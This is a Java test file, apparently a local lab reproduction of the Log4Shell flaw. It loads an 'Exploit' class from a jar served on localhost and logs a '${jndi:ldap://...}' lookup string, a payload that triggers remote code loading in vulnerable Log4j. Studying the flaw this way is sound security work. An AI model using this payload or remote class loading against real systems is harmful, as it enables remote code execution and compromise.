package xyz.bumbing.log4j;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.RestController;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.util.StringTokenizer;
import java.util.Vector;


@RestController
@Slf4j
public class Test {
    public static void main(String[] args) throws Exception {

        //URLClassLoader 테스트
        String[] strings = {"http://localhost:7080"};
        ClassLoader parent =getContextClassLoader();
        URL[] urlArray = getUrlArray("http://localhost:7080/exploit-1.jar");
        URLClassLoader urlClassLoader = URLClassLoader.newInstance(urlArray, parent);
        Class<?> exploit = urlClassLoader.loadClass("kr.co.everex.exploit.Exploit");


        //lookup 테스트
//        Context context =  new InitialContext();
//        Object lookup = context.lookup("ldap://localhost/cn=log4j,dc=everex,dc=kr");

        //log4j 테스트
        log.info("${jndi:ldap://localhost/cn=log4j,dc=everex,dc=kr}");
    }

    //JNDI 들어가 있는 메소드
    static protected URL[] getUrlArray(String codebase)
            throws MalformedURLException {
        // Parse codebase into separate URLs
        StringTokenizer parser = new StringTokenizer(codebase);
        Vector<String> vec = new Vector<>(10);
        while (parser.hasMoreTokens()) {
            vec.addElement(parser.nextToken());
        }
        String[] url = new String[vec.size()];
        for (int i = 0; i < url.length; i++) {
            url[i] = vec.elementAt(i);
        }

        URL[] urlArray = new URL[url.length];
        for (int i = 0; i < urlArray.length; i++) {
            urlArray[i] = new URL(url[i]);
        }
        return urlArray;
    }

    //JNDI 들어가 있는 메소드
    static ClassLoader getContextClassLoader() {

        return AccessController.doPrivileged(
                new PrivilegedAction<ClassLoader>() {
                    public ClassLoader run() {
                        ClassLoader loader =
                                Thread.currentThread().getContextClassLoader();
                        if (loader == null) {
                            // Don't use bootstrap class loader directly!
                            loader = ClassLoader.getSystemClassLoader();
                        }

                        return loader;
                    }
                }
        );
    }

}
